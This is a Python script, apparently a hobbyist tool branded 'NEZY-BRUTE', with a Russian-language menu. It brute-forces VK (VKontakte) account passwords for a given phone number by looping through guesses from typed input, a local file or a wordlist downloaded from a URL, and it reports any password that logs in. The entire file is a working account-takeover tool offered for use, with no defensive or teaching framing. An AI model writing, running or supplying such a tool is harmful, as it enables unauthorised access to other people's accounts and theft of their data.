import requests
import os
import time
import vk_api
import colorama
from colorama import init
from colorama import Fore, Back, Style
from datetime import date
import datetime
init()


def autorize(phone, password):
    session = vk_api.VkApi(phone, password)
    session.auth()


print(Fore.MAGENTA, ' _   _                ')
print(Fore.MAGENTA, '| \ | |               ')
print(Fore.MAGENTA, '|  \| | ___ _____   _ ')
print(Fore.MAGENTA, '| . ` |/ _ \_  / | | |')
print(Fore.MAGENTA, '| |\  |  __// /| |_| |')
print(Fore.MAGENTA, '\_| \_/\___/___|\__, |')
print(Fore.MAGENTA, '                 __/ |')
print(Fore.MAGENTA, '                |___/ ')
print('\n')
print(Fore.WHITE, 'Coded by @NezyGhoul#8130 feat by Doctor Dx!')
print('\n')


print(Fore.LIGHTCYAN_EX, '[1] Через введенную строку.')
print(Fore.LIGHTCYAN_EX, '[2] Через файл.')
print(Fore.LIGHTCYAN_EX, '[3] Через ссылку.')
method = input('Выбери метод брутфорса -> ')

if int(method) == 1:
    phone = input('[*] Напишите номер телефона -> ')
    catched = list(map(str, input("[*] Введи слова для брутфорса через запятую -> ").split(', ')))
    for password in catched:
      try:
         autorize(phone, str(password))
         print(Fore.GREEN, '[NEZY-BRUTE] Пароль успешно подобран: ' + str(password) + ' Время: ' + str(datetime.datetime.now()))
      except:
        print(Fore.RED, '[NEZY-BRUTE] Пароль неверный: ' + str(password))
    os.system('pause')
if int(method) == 2:
    phone = input('[*] Напишите номер телефона -> ')
    filename = input('[*] Введите название файла -> ')
    with open(filename) as file:
        lines = file.readlines()
    password_lines = [line.strip('\n') for line in open(filename)]
    for password in password_lines:
        try:
            autorize(phone, str(password))
            print(Fore.GREEN, '[NEZY-BRUTE] Пароль успешно подобран: ' + str(password) + ' Время: ' + str(datetime.datetime.now()))
        except:
            print(Fore.RED, '[NEZY-BRUTE] Пароль неверный: ' + str(password))
    file.close()
    os.system('pause')
if int(method) == 3:
     phone = input('[*] Напишите номер телефона -> ')
     url = input('[*] Введите ссылку на базу паролей -> ')
     rq = requests.get(url)
     password_lines = list(map(str, rq.text.split('\n')))
     for password in password_lines:
        try:
            autorize(phone, str(password))
            print(Fore.GREEN, '[NEZY-BRUTE] Пароль успешно подобран: ' + str(password) + ' Время: ' + str(datetime.datetime.now()))
        except:
            print(Fore.RED, '[NEZY-BRUTE] Пароль неверный: ' + str(password))
     os.system('pause')
else:
    print(Fore.RED, '[-] Такого действия нету. Попробуйте снова!')
    os.system('pause')